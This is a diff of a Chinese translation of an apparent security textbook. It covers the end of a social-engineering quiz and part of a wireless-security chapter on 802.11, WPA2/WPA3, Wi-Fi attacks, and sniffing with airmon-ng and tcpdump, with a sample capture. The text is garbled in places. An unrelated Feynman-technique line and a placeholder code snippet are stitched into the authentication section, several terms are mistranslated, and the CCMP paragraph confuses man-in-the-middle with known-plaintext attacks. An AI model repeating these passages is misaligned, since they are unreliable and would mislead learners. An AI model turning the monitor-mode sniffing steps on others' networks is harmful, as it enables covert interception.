+14. `proximity` 卡（proximity card）最容易受到哪种攻击？
+
+   1. 尾随（Tailgating）
+
+   2. 钓鱼（Phishing）
+
+   3. 凭证窃取（Credential theft）
+
+   4. 克隆（Cloning）
+
+15. 哪种生物特征扫描的是眼球周围（虹膜）的图案？
+
+   1. 视网膜扫描（Retinal scanning）
+
+   2. 指纹扫描（Fingerprint scanning）
+
+   3. 彩色扫描（Iris scanning）
+
+   4. 乌维扫描（Uvea scanning）
+
+16. 高假负率（false failure rate）会导致什么结果？
+
+   1. 人们需要联系安保人员
+
+   2. 未经授权的人员被允许进入
+
+   3. 强制使用人阱（man trap）
+
+   4. 减少生物特征认证的使用
 
 17. 你收到了一条来自未知号码的短信，该号码只有五位数字。它没有任何文字，只有一个链接。这可能是一个什么例子？
 
-     1. `Vishing`
+   1. `Vishing`
 
-     2. `Smishing`
+   2. `Smishing`
 
-     3. `Phishing`
+   3. `Phishing`
 
-     4. `Impersonation`
+   4. `Impersonation`
 
 18. 电话通话相对于网络钓鱼邮件的优势是什么？
 
-     1. 你可以通过`pretexting`进行更详细的说明。
+   1. 你可以通过`pretexting`进行更详细的说明。
 
-     2. `Phishing`攻击不可靠。
+   2. `Phishing`攻击不可靠。
 
-     3. 并非所有人都有电子邮件，但所有人都有手机。
+   3. 并非所有人都有电子邮件，但所有人都有手机。
 
-     4. `Pretexting`仅在电话上有效。
+   4. `Pretexting`仅在电话上有效。
 
 19. 当你在公共场所连接到无线接入点时，你可能会看到的网页是什么？
 
-     1. `Credential harvester`
+   1. `Credential harvester`
 
-     2. `Captive portal`
+   2. `Captive portal`
 
-     3. `Wi‑Fi portal`
+   3. `Wi‑Fi portal`
 
-     4. `Authentication point`
+   4. `Authentication point`
 
 20. 哪种工具可以用于生成电子邮件攻击以及无线攻击？
 
-     1. `Meterpreter`
+   1. `Meterpreter`
 
-     2. `wifiphisher`
+   2. `wifiphisher`
 
-     3. `SE Toolkit`
+   3. `SE Toolkit`
 
-     4. `Social Automator`
+   4. `Social Automator`
 
 21. 如果你在办公室里随意丢弃带有恶意软件的 USB 盾，并期待用户将它们插入系统，你使用的是哪种社交工程技术？
 
-     1. `Pretexting`
+   1. `Pretexting`
 
-     2. `Identity theft`
+   2. `Identity theft`
 
-     3. `Contact spamming`
+   3. `Contact spamming`
 
-     4. `Baiting`
+   4. `Baiting`
 
 22. 你的同事突然给你打电话，说他们收到了来自你的奇怪邮件，在询问你在做什么。如果你没有发送这条信息，你应该怀疑什么？
 
-     1. `Quid pro quo`
+   1. `Quid pro quo`
 
-     2. `Cloning`
+   2. `Cloning`
 
-     3. `Contact spamming`
+   3. `Contact spamming`
 
-     4. `Man traps`
+   4. `Man traps`
 
 23. 哪些以下信息对攻击者来说不具备窃取身份的兴趣？
 
-     1. `Birthplace`
+   1. `Birthplace`
 
-     2. `First book you ever read`
+   2. `First book you ever read`
 
-     3. `Mother's maiden name`
+   3. `Mother's maiden name`
 
-     4. `Social Security number`
+   4. `Social Security number`
 
 24. 如果攻击者使用“建议交换”（quid pro quo）作为手段让你提供信息，他们最有可能冒充谁？
 
-     1. `Your car dealer`
+   1. `Your car dealer`
 
-     2. `Help‑desk staff`
+   2. `Help‑desk staff`
 
-     3. `Your mother`
+   3. `Your mother`
 
-     4. `Your dog`
+   4. `Your dog`
 
 25. 哪些以下做法不适合保护身份盗用？
 
-     1. `Shredding bank records`
+   1. `Shredding bank records`
 
-     2. `Using long and strong passwords`
+   2. `Using long and strong passwords`
 
-     3. `Encrypting your file system`
+   3. `Encrypting your file system`
 
-     4. `Using a safe to store sensitive documents`
+   4. `Using a safe to store sensitive documents`
 
-# Chapter 11  
+# Chapter 11
 
 Wireless Security
 
@@ -9799,7 +10787,9 @@ Wireless Security
 
 Wi‑Fi 涵盖所有属于 IEEE 802.11 标准的协议。Wi‑Fi 是 Wi‑Fi 联盟的商标，用于通过无线连接实现设备认证的设备。无论你称之为 Wi‑Fi 还是 802.11，都是指通过无线方式提供网络连接。这看起来很直接，而且如果你在使用它，通常也是如此。但 Wi‑Fi 自推出以来经历了多个版本，部分版本对 Wi‑Fi 的工作方式进行了重大改变。
 
-首先，802.11 是定义物理层和数据链路层的规范集合。物理层指定了传输数据的调制方式以及使用的频率范围。最初的 802.11 版本在 2.4 GHz 频段进行传输，数据速率在 1 Mbps 到 2 Mbps 之间。该频段同样被其他技术（如微波炉和部分无绳电话）占用，属于工业、科学和医疗（ISM）频段，导致频谱比较拥挤，可能产生干扰。
+首先，802.11 是定义物理层和数据链路层的规范集合。物理层指定了传输数据的调制方式以及使用的频率范围。最初的 802.11 版本在 2.4 GHz 频段进行传输，数据速率在 1 Mbps 到 2 Mbps 之间。该频段同样被其他技术（如微波炉和部分无绳电话）占用，属于工业、科学和医疗（ISM）频段，导致频谱比较拥挤，可能产生干扰。
+
+
 
 虽然早期的 802.11a 支持 5 GHz 和 2.4 GHz 双频段，但在消费者市场中并未广泛采用。直到 2009 年 802.11n 发布，5 GHz 才成为 Wi‑Fi 网络可行的频段。此后，802.11ac 以及提案的 802.11ax 也都被指定在 5 GHz 频段工作。这带来的问题是，已有的旧无线卡只能在其原本调谐的频段上工作；如果网络采用 802.11ac 并在 5 GHz 频段运行，而网络中仍有大量 802.11g 卡，这些卡将无法连接到新网络。
 
@@ -9807,62 +10797,55 @@ Wi‑Fi 涵盖所有属于 IEEE 802.11 标准的协议。Wi‑Fi 是 Wi‑Fi 联
 
 802.11 使用信道以防止不同信号相互干扰。在美国，2.4 GHz 频段有 11 条可用信道。信道是频率的有限范围，类似于电视频道或无线电电台的频率分配，具体取决于所需的带宽。不同地区根据管理频谱的监管机构规定，可使用 14 条信道。若使用支持 5 GHz 频段的 802.11 版本，可用的信道数量因国家而异，且 5 GHz 的使用情况比 2.4 GHz 更不统一。后续版本已在 60 GHz 频段运行或计划运行，该频段仅有六条信道可用。
 
+- [802.11]的不同版本之间的一个差异是信号预计能传输的距离。一些[802.11]版本仅能传输约[11]英尺的距离。其他版本预计可传输数百英尺。这取决于墙壁的数量和墙体的构成。[Wi‑Fi]信号在户外可以传播得更远，因为没有障碍物阻碍信号。室内情况则完全不同。在未实际进入建筑物的情况下，距离建筑物多远才能捕获信号取决于最近的接入点距离外部墙壁的近近程度以及窗户的数量。窗户通常会让信号顺畅通过。
 
+- 从拓扑结构的角度来看，设置[Wi‑Fi]网络有两种不同的方式。其中一种比另一种更为常见，但两者都有可能出现。除此之外，还需要关注[Wi‑Fi]网络如何处理认证和加密。认证和加密机制都可能成为攻击无线网络的途径，尤其是当公司允许员工将个人设备连接到企业网络时。
 
+## `Wi‑Fi` 网络类型
 
--   [802.11]的不同版本之间的一个差异是信号预计能传输的距离。一些[802.11]版本仅能传输约[11]英尺的距离。其他版本预计可传输数百英尺。这取决于墙壁的数量和墙体的构成。[Wi‑Fi]信号在户外可以传播得更远，因为没有障碍物阻碍信号。室内情况则完全不同。在未实际进入建筑物的情况下，距离建筑物多远才能捕获信号取决于最近的接入点距离外部墙壁的近近程度以及窗户的数量。窗户通常会让信号顺畅通过。
-
--   从拓扑结构的角度来看，设置[Wi‑Fi]网络有两种不同的方式。其中一种比另一种更为常见，但两者都有可能出现。除此之外，还需要关注[Wi‑Fi]网络如何处理认证和加密。认证和加密机制都可能成为攻击无线网络的途径，尤其是当公司允许员工将个人设备连接到企业网络时。
-
-### `Wi‑Fi` 网络类型
-
--   你会遇到两种无线网络。我们可以从拓扑结构讨论，因为这在技术上是相关的，尽管比有线网络更难以概念化。让我们尝试一下。第一种网络类型，也是在商业环境中较少见的，是自发（ad‑hoc）网络。自发网络不依赖任何中央路由或交换设备。Figure 11.1 展示了一个自发无线网络，其中不同类型的设备相互连接。你可以把它想象成一个动态的网格网络，每个设备直接与另一个设备通信。连接是在两个设备需要对话时动态建立的。当设备加入网络时，它会将信息分享给其他设备，其他设备随后知道如何建立连接以便通信。
+- 你会遇到两种无线网络。我们可以从拓扑结构讨论，因为这在技术上是相关的，尽管比有线网络更难以概念化。让我们尝试一下。第一种网络类型，也是在商业环境中较少见的，是自发（ad‑hoc）网络。自发网络不依赖任何中央路由或交换设备。Figure 11.1 展示了一个自发无线网络，其中不同类型的设备相互连接。你可以把它想象成一个动态的网格网络，每个设备直接与另一个设备通信。连接是在两个设备需要对话时动态建立的。当设备加入网络时，它会将信息分享给其他设备，其他设备随后知道如何建立连接以便通信。
 
 ![FIGURE 11.1 Wireless ad hoc network](img/c11f001.png)
 
 **FIGURE 11.1** Wireless ad hoc network
 
--   并不是任何人都能随意连接到自发网络。自发网络启动时，需要给网络起名，并且可能需要密码才能访问。由于没有其他设备负责转发消息，自发网络中的所有设备必须在彼此的覆盖范围内，否则无法发送消息。自发网络也不提供加密。[Wi‑Fi Direct] 取代了自发网络，并支持设备间的加密。
+- 并不是任何人都能随意连接到自发网络。自发网络启动时，需要给网络起名，并且可能需要密码才能访问。由于没有其他设备负责转发消息，自发网络中的所有设备必须在彼此的覆盖范围内，否则无法发送消息。自发网络也不提供加密。[Wi‑Fi Direct] 取代了自发网络，并支持设备间的加密。
 
--   虽然自发网络易于部署且速度快，但管理困难，且不适合企业环境。取而代之的是基础设施网络。基础设施网络有一个中心设备，充当交换机的角色。计算机之间不直接通信，所有消息都通过接入点传递。Figure 11.2 展示了基础设施网络。交换机控制电气信号，因此它决定了系统是否接收到流量；接入点则没有控制权，因为所有流量都在空中传播，只需一台能够捕获射频信号的无线电即可接收。
+- 虽然自发网络易于部署且速度快，但管理困难，且不适合企业环境。取而代之的是基础设施网络。基础设施网络有一个中心设备，充当交换机的角色。计算机之间不直接通信，所有消息都通过接入点传递。Figure 11.2 展示了基础设施网络。交换机控制电气信号，因此它决定了系统是否接收到流量；接入点则没有控制权，因为所有流量都在空中传播，只需一台能够捕获射频信号的无线电即可接收。
 
 ![FIGURE 11.2 Wireless infrastructure network](img/c11f002.png)
 
 **FIGURE 11.2** Wireless infrastructure network
 
--   为了说明这一点，请查看 Figure 11.3。这是一段开启无线接口监听模式的 Wireshark 捕获。监听模式使 Wireshark 能够捕获所有无线电帧头部，即帧的第 1/2 层头部。该系统当前未连接到任何无线网络，可以类比于有线接口被断开。在这种情况下，Wireshark 不应捕获到任何流量，即使开启混杂模式，也没有内容。
+- 为了说明这一点，请查看 Figure 11.3。这是一段开启无线接口监听模式的 Wireshark 捕获。监听模式使 Wireshark 能够捕获所有无线电帧头部，即帧的第 1/2 层头部。该系统当前未连接到任何无线网络，可以类比于有线接口被断开。在这种情况下，Wireshark 不应捕获到任何流量，即使开启混杂模式，也没有内容。
 
 ![FIGURE 11.3 Wireshark capture of radio traffic](img/c11f003.png)
 
 **FIGURE 11.3** Wireshark capture of radio traffic
 
--   捕获内容显示大量流量，这是因为无线网络非常“聒噪”。没有电力连接指示系统网络已就绪，无线设备只能不断发送探测请求来发现网络。开启监听模式后，可以看到接入点与客户端之间的交互。例如，接入点会定期发送 beacon 帧以宣布网络的存在。客户端也会发送探测请求（probe request）以识别附近的网络。探测请求发出后，接入点会回复探测响应（probe response）。如果查看本地的无线网络列表，你会看到操作系统正在发送探测消息，以寻找网络。要连接到网络，首先必须识别该网络。
+- 捕获内容显示大量流量，这是因为无线网络非常“聒噪”。没有电力连接指示系统网络已就绪，无线设备只能不断发送探测请求来发现网络。开启监听模式后，可以看到接入点与客户端之间的交互。例如，接入点会定期发送 beacon 帧以宣布网络的存在。客户端也会发送探测请求（probe request）以识别附近的网络。探测请求发出后，接入点会回复探测响应（probe response）。如果查看本地的无线网络列表，你会看到操作系统正在发送探测消息，以寻找网络。要连接到网络，首先必须识别该网络。
 
-### `Wi‑Fi` 认证
+## `Wi‑Fi` 认证
 
--   [Wi‑Fi] 网络上有多种认证方式。我们首先介绍一种简单的机器级认证。此方式下，客户端将自身注册到网络。为此，系统会发送探测请求以识别附近的无线网络。客户端在寻找服务集标识符（SSID），即网络的名称。可能会有多个接入点共享同一 SSID，因为大型设施的单个接入点信号不足以覆盖全部区域。为区分使用相同 SSID 的不同接入点，需要使用基础服务集标识符（BSSID），它看起来像 MAC 地址，从而让客户端能够与特定的接入点通信。你可以在 Figure 11.4 中看到多个 BSSID 共享同一 SSID 的示例。阿特兰蒂斯宾客（Atlantis‑Guest）网络就有两条记录，每条拥有自己的 BSSID，但共享相同的 SSID。
+- [Wi‑Fi] 网络上有多种认证方式。我们首先介绍一种简单的机器级认证。此方式下，客户端将自身注册到网络。为此，系统会发送探测请求以识别附近的无线网络。客户端在寻找服务集标识符（SSID），即网络的名称。可能会有多个接入点共享同一 SSID，因为大型设施的单个接入点信号不足以覆盖全部区域。为区分使用相同 SSID 的不同接入点，需要使用基础服务集标识符（BSSID），它看起来像 MAC 地址，从而让客户端能够与特定的接入点通信。你可以在 Figure 11.4 中看到多个 BSSID 共享同一 SSID 的示例。阿特兰蒂斯宾客（Atlantis‑Guest）网络就有两条记录，每条拥有自己的 BSSID，但共享相同的 SSID。
 
 ![FIGURE 11.4 Multiple BSSIDs for a single SSID](img/c11f004.png)
 
 **FIGURE 11.4** Multiple BSSIDs for a single SSID
 
--   要让客户端连接到接入点，需要先进行认证。如果接入点开启了开放认证（Open Authentication），该过程相对简单。客户端发送认证请求，接入点通常回复“Successful”，随后客户端可进入下一阶段。
+- 要让客户端连接到接入点，需要先进行认证。如果接入点开启了开放认证（Open Authentication），该过程相对简单。客户端发送认证请求，接入点通常回复“Successful”，随后客户端可进入下一阶段。
 
--   认证完成后，下一步是将客户端关联（associate）到网络。客户端向接入点发送关联请求，请求中包含该站点（station）的能力，如支持的版本和速率。这使得接入点与站点能够协商后续的通信方式。Figure 11.5 展示了完成认证并关联的过程图。
+- 认证完成后，下一步是将客户端关联（associate）到网络。客户端向接入点发送关联请求，请求中包含该站点（station）的能力，如支持的版本和速率。这使得接入点与站点能够协商后续的通信方式。Figure 11.5 展示了完成认证并关联的过程图。
 
 ![FIGURE 11.5 Authentication and association steps](img/c11f005.png)
 
+- [认证和关联步骤](https://example.org/authentication-and-association-steps)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
 
-
--   [认证和关联步骤](https://example.org/authentication-and-association-steps)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，难以遗忘。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 # 四向握手用于 WPA2
 
@@ -9870,41 +10853,41 @@ if (condVar > someVal) {console.log("xxx")}
 
 正如使用 WPA 时，个人认证和企业认证均可用，手握过程与认证方式无关，无论使用哪种认证方式。
 
-个人认证需要预共享密钥。企业认证使用 802.1X 处理用户级认证，即连接网络的用户必须提供用户名和密码。所使用的认证框架是 EAP，且有多种 EAP 变体。<x_0.393><y_0.2437>Figure 11.7 显示了不同的 EAP 变体及其他可能使用的认证协议列表。此为 Linux 系统配置页面的截图，用于设置无线网络连接。
+个人认证需要预共享密钥。企业认证使用 802.1X 处理用户级认证，即连接网络的用户必须提供用户名和密码。所使用的认证框架是 EAP，且有多种 EAP 变体。Figure 11.7 显示了不同的 EAP 变体及其他可能使用的认证协议列表。此为 Linux 系统配置页面的截图，用于设置无线网络连接。
 
 一些常见的变体是 Lightweight Extensible Authentication Protocol（LEAP）和 Protected Extensible Authentication Protocol（PEAP）。这些框架以及 EAP‑TLS 等其他框架，用于确保认证在受保护的通道中进行，认证参数不会以明文形式发送。此外，密钥交换也通过受保护的通道完成，通常是通过传输层安全（TLS）。这是 Web 流量加密的实现方式，使用证书和非对称密钥的公私钥加密。
 
-![FIGURE 11.7 Wireless configuration under Linux](img/c11f007.png)<x_0.3029><y_0.3125>
+![FIGURE 11.7 Wireless configuration under Linux](img/c11f007.png)
 
-**FIGURE 11.7** Wireless configuration under Linux<x_0.393><y_0.3234>
+**FIGURE 11.7** Wireless configuration under Linux
 
-### Wi‑Fi Protected Access 3
+## Wi‑Fi Protected Access 3
 
 2018 年，Wi‑Fi 联盟推出 Wi‑Fi Protected Access 3（WPA3），以解决 WPA2 的一些弱点。首先是支持更长的加密密钥，最高可达 AES‑256，并使用 SHA‑384 进行消息认证的密码学哈希。此外，WPA3 引入了 Simultaneous Authentication of Equals（SAE）以取代预共享密钥。使用预共享密钥是一个弱点，因为它是一段信息，可能难以完全保护。当预共享密钥用于认证时，任何获取该密钥的人都可以进行认证。SAE 是一种基于密码的认证策略，用于协商后用于加密站点与接入点之间会话的密钥。
 
 使用 SAE 的认证和关联过程与前面描述的四向过程不同。这是 SAE 使用的过程。
 
-1. 站点（STA）向接入点（AP）发送探测请求。<x_0.393><y_0.3953>
+1. 站点（STA）向接入点（AP）发送探测请求。
 
-2. AP 向 STA 发送探测响应。<x_0.393><y_0.4063>
+2. AP 向 STA 发送探测响应。
 
-3. STA 向 AP 发送认证提交，用于在 STA 上生成 pairwise master key（PMK）。这是一个 802.11 认证帧。<x_0.393><y_0.4135>
+3. STA 向 AP 发送认证提交，用于在 STA 上生成 pairwise master key（PMK）。这是一个 802.11 认证帧。
 
-4. AP 向 STA 发送认证提交，用于在 AP 上生成 pairwise master key。这也是一个 802.11 认证帧。<x_0.393><y_0.4206>
+4. AP 向 STA 发送认证提交，用于在 AP 上生成 pairwise master key。这也是一个 802.11 认证帧。
 
-5. STA 向 AP 发送认证提交，这是一个 802.11 认证帧，包含用于 AP 验证的密钥生成的消息。<x_0.393><y_0.4277>
+5. STA 向 AP 发送认证提交，这是一个 802.11 认证帧，包含用于 AP 验证的密钥生成的消息。
 
-6. AP 向 STA 发送认证提交，这也是一个 802.11 认证帧，包含用于 STA 验证的密钥生成的消息。<x_0.393><y_0.4348>
+6. AP 向 STA 发送认证提交，这也是一个 802.11 认证帧，包含用于 STA 验证的密钥生成的消息。
 
-7. 常规关联请求。<x_0.393><y_0.4415>
+7. 常规关联请求。
 
-8. 常规关联响应。<x_0.393><y_0.4482>
+8. 常规关联响应。
 
-9. 使用前面步骤生成的 PMK 进行四向手 shake。<x_0.393><y_0.4547>
+9. 使用前面步骤生成的 PMK 进行四向握手。
 
 WPA3 仍然强制使用 Counter Mode Cipher Block Chaining Message Authentication Code Protocol，即 CCM 模式协议（CCMP）。这是一组综合的密码协议，用于解决 WEP 弱点。它结合了加密、认证和完整性，确保消息未被篡改且来源于正确的端点，从而防止中间人攻击。CCMP 使用块密码进行加密，消息以固定长度块的形式加密。虽然中间人攻击（plaintext 可用于攻击加密）是可能的，但 CCMP 能够防范此类攻击。中间人攻击是通过利用明文来减弱密钥强度，从而使破解过程更易进行的攻击方式。
 
-### Bring Your Own Device
+## Bring Your Own Device
 
 你大概至少拥有一台移动设备，无论是智能手机、平板还是笔记本电脑。也可能是像 Microsoft Surface 这样的混合设备。由于这些设备的普及和易用性，人们随身携带它们，几乎随时都有智能手机在手。企业往往希望利用这些计算资源，因此可能会制定允许员工使用个人设备在企业网络上工作的政策。该政策通常称为 bring your own device（BYOD）。公司可能要求设备经过批准或满足最低要求。
 
@@ -9916,14 +10899,11 @@ WPA3 仍然强制使用 Counter Mode Cipher Block Chaining Message Authenticatio
 
 企业在允许 BYOD 的同时，常见做法是实现 guest network。这是一个独立的、隔离的网络，供不受信任的用户使用。为了获取企业资源，客户端可能需要使用 VPN 建立受信任的加密连接到内部网络。
 
-### Wi‑Fi 攻击
+## Wi‑Fi 攻击
 
+- [攻击 Wi‑Fi 网络的不同方式](https://example.org) 首先，与任何类型的攻击一样，可以先进行侦察。你可以使用 Wireshark 和其他工具来完成这一点。当你在进行嗅探时，需要生成流量。一种方法是强制终端进行身份验证。你可以使用去认证攻击（deauthentication attack）来实现这一点。另一种攻击方式是所谓的 `evil twin`。这是一个恶意接入点，但它模仿合法的接入点。还有一种称为 KRACK（关键重新安装攻击）的攻击，可以用来迫使终端以攻击者能够轻松解密的方式发送消息。
 
-
-
--   [攻击 Wi‑Fi 网络的不同方式](https://example.org) 首先，与任何类型的攻击一样，可以先进行侦察。你可以使用 Wireshark 和其他工具来完成这一点。当你在进行嗅探时，需要生成流量。一种方法是强制终端进行身份验证。你可以使用去认证攻击（deauthentication attack）来实现这一点。另一种攻击方式是所谓的 `evil twin`。这是一个恶意接入点，但它模仿合法的接入点。还有一种称为 KRACK（关键重新安装攻击）的攻击，可以用来迫使终端以攻击者能够轻松解密的方式发送消息。
-
-### 无线足迹探测
+## 无线足迹探测
 
 无线足迹探测是识别区域内的无线网络或理解这些无线网络边界的过程。有些人称之为 war‑driving，这是一个较旧的术语。你可以使用 Kismet（在 Linux 系统上）或 WiFi Explorer（在 macOS 上）等多种工具进行此操作。这些工具会列出所有正在广播的无线网络，并提供信号强度读数，让你对距离接入点的远近有一个直观感受。
 
@@ -9931,81 +10911,81 @@ WPA3 仍然强制使用 Counter Mode Cipher Block Chaining Message Authenticatio
 
 无线足迹探测的一个局限是所使用的天线技术。大多数无线天线是全向的，一次性向四周发射信号，导致信号强度分散。接收天线同样是从四面八方接收。提高信号强度的方法是使用能够聚焦信号的设备，使接收天线接收到的信号更强。长期以来人们认为，将 Pringles 罐与无线天线配合使用可以增强信号强度。只要这种做法可行，它之所以有效是因为它将天线转变为定向天线，从而让更多的信号命中天线，提升接收质量。这也意味着你需要移动天线，因为它只能从你指向的方向接收信号。
 
-### 捕获流量
+## 捕获流量
 
 如前所述，Wireshark 可以捕获包括无线电头在内的网络流量。无线电头在信息收集时非常重要，但它并不是唯一携带信息的头部。你需要查看所有来自接入点的 beacon 以及站点与接入点之间可能发送的认证消息。为了看到完整的协议栈，需要将无线网卡设置为监听模式。实现此目的的一种方法是使用 `aircrack-ng` 包中的 `airmon-ng` 程序。下面的代码片段展示了使用 `airmon-ng` 将无线网卡创建为监听接口的过程。最终，你将拥有一个新接口，用于收集无线电流量和其他流量。
 
-**使用 airmon-ng**
+### 使用 airmon-ng
 
 ```
- root@quiche:~# airmon-ng start wlan0
- 
- Found 3 processes that could cause trouble.
- Kill them using 'airmon-ng check kill' before putting
- the card in monitor mode, they will interfere by changing channels
- and sometimes putting the interface back in managed mode
- 
+root@quiche:~# airmon-ng start wlan0
+
+Found 3 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
    PID Name
    640 wpa_supplicant
    30835 NetworkManager
    30859 dhclient
- 
+
    PHY      Interface     Driver          Chipset
- 
+
    phy0     wlan0           rt2800usb     Ralink Technology, Corp. RT5372
- 
+
               (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
               (mac80211 station mode vif disabled for [phy0]wlan0)
 ```
 
+
+
 你会注意到开头有一些警告。这是因为本 Linux 版本管理网络接口。`airmon-ng` 需要能够对网络接口进行修改，最好在运行它时不要有管理接口的进程。虽然本例在 Linux 下运行，但 `aircrack-ng` 也提供 Windows 版本，同样的程序可以在 Windows 上使用。监听接口创建完成后，你可以像使用其他网络接口一样使用它。你可以使用 `tcpdump` 捕获通过监听接口传输的所有网络流量。下面的代码片段展示了使用 `tcpdump` 通过 `wlan0mon`（由 `airmon-ng` 创建）进行捕获的过程。
 
-**使用 tcpdump 与监听接口**
+## 使用 tcpdump 与监听接口
 
 ```
- root@quiche:~# tcpdump -i wlan0mon
- tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
- listening on wlan0mon, link-type IEEE802_11_RADIO (802.11 plus radiotap header), capture size 262144 bytes
- 20:49:20.747433 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Data IV:8cae Pad 20 KeyID 2
- 20:49:21.190521 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
- 20:49:21.387878 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Probe Request (WifiMyqGdo) [1.0 2.0 5.5 11.0 Mbit]
- 20:49:21.403289 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Probe Request (WifiMyqGdo) [1.0 2.0 5.5 11.0 Mbit]
- 20:49:21.537165 1.0 Mb/s 2457 MHz 11b -47dBm signal antenna 1 Probe Request (ZoeyWasHere) [1.0 2.0 5.5 11.0 Mbit]
- 20:49:21.589809 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Acknowledgment RA:64:1c:b0:94:ba:57 (oui Unknown)
- 20:49:21.689230 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
- 20:49:23.247016 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Acknowledgment RA:ec:aa:a0:4d:31:a8 (oui Unknown)
- 20:49:23.250814 1.0 Mb/s 2457 MHz 11b -65dBm signal antenna 1 Acknowledgment RA:f6:aa:a0:4d:31:a8 (oui Unknown)
- 20:49:23.594399 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Acknowledgment RA:64:1c:b0:94:ba:57 (oui Unknown)
- 20:49:23.602831 1.0 Mb/s 2457 MHz 11b -21dBm signal antenna 1 Beacon (CasaChien) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 11, PRIVACY
- 20:49:24.258485 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
- 20:49:24.635482 1.0 Mb/s 2457 MHz 11b -57dBm signal antenna 1 Probe Request (CasaChien) [1.0 2.0 5.5 11.0 6.0 9.0 12.0 18.0 63.5 Mbit]
- 20:49:24.656324 1.0 Mb/s 2457 MHz 11b -51dBm signal antenna 1 Acknowledgment RA:18:d6:c7:7d:ee:11 (oui Unknown)
- 20:49:24.658753 1.0 Mb/s 2457 MHz 11b -51dBm signal antenna 1 Acknowledgment RA:70:3a:cb:52:ab:fc (oui Unknown)
- 
+root@quiche:~# tcpdump -i wlan0mon
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on wlan0mon, link-type IEEE802_11_RADIO (802.11 plus radiotap header), capture size 262144 bytes
+20:49:20.747433 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Data IV:8cae Pad 20 KeyID 2
+20:49:21.190521 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
+20:49:21.387878 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Probe Request (WifiMyqGdo) [1.0 2.0 5.5 11.0 Mbit]
+20:49:21.403289 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Probe Request (WifiMyqGdo) [1.0 2.0 5.5 11.0 Mbit]
+20:49:21.537165 1.0 Mb/s 2457 MHz 11b -47dBm signal antenna 1 Probe Request (ZoeyWasHere) [1.0 2.0 5.5 11.0 Mbit]
+20:49:21.589809 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Acknowledgment RA:64:1c:b0:94:ba:57 (oui Unknown)
+20:49:21.689230 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
+20:49:23.247016 1.0 Mb/s 2457 MHz 11b -67dBm signal antenna 1 Acknowledgment RA:ec:aa:a0:4d:31:a8 (oui Unknown)
+20:49:23.250814 1.0 Mb/s 2457 MHz 11b -65dBm signal antenna 1 Acknowledgment RA:f6:aa:a0:4d:31:a8 (oui Unknown)
+20:49:23.594399 1.0 Mb/s 2457 MHz 11b -19dBm signal antenna 1 Acknowledgment RA:64:1c:b0:94:ba:57 (oui Unknown)
+20:49:23.602831 1.0 Mb/s 2457 MHz 11b -21dBm signal antenna 1 Beacon (CasaChien) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 11, PRIVACY
+20:49:24.258485 1.0 Mb/s 2457 MHz 11b -43dBm signal antenna 1 Clear-To-Send RA:64:1c:b0:94:ba:57 (oui Unknown)
+20:49:24.635482 1.0 Mb/s 2457 MHz 11b -57dBm signal antenna 1 Probe Request (CasaChien) [1.0 2.0 5.5 11.0 6.0 9.0 12.0 18.0 63.5 Mbit]
+20:49:24.656324 1.0 Mb/s 2457 MHz 11b -51dBm signal antenna 1 Acknowledgment RA:18:d6:c7:7d:ee:11 (oui Unknown)
+20:49:24.658753 1.0 Mb/s 2457 MHz 11b -51dBm signal antenna 1 Acknowledgment RA:70:3a:cb:52:ab:fc (oui Unknown)
 ```
 
 从 `tcpdump` 输出可以看到所有的无线电流量，包括信号信息。你可以看到使用的频率为 2457 MHz，所有消息均使用该频率。你还可以看到信号强度，以 dBm 表示，是相对于一毫瓦的对数比值。dBm 本身不是比值，而是一个绝对值，以 milliwatt 为基准。它是无线网络中测量信号强度的标准方式。最佳信号强度为 –10 dBm。你可以看到 –19 dBm 到 –67 dBm 的数值，这些仍然是可用的信号。无线网络的最低可用信号约为 –100 dBm，超过此值则不可用。
 
+- [tcpdump]输出中可看到的都是用于网络的探测请求。这些探测请求来源于曾经连接到这些网络的设备。例如，有一个具有无线功能的车库门开启器正在尝试寻找名为 `WifiMyqGdo` 的网络。该设备在出厂时已被配置为使用该网络。
 
+如果你尝试进行恶意双胞胎攻击，这些信息可能会有用。不过，你可能还想从数据包捕获中获取其他信息。你可以直接写出数据包捕获内容。下面的列表展示了如何使用 `tcpdump` 写出数据包捕获。由于我们使用的是监听接口，仍然能够获取所有的无线电信息。
 
--   [tcpdump]输出中可看到的都是用于网络的探测请求。这些探测请求来源于曾经连接到这些网络的设备。例如，有一个具有无线功能的车库门开启器正在尝试寻找名为 **WifiMyqGdo** 的网络。该设备在出厂时已被配置为使用该网络。
+## Writing a Capture from a Monitor Interface
 
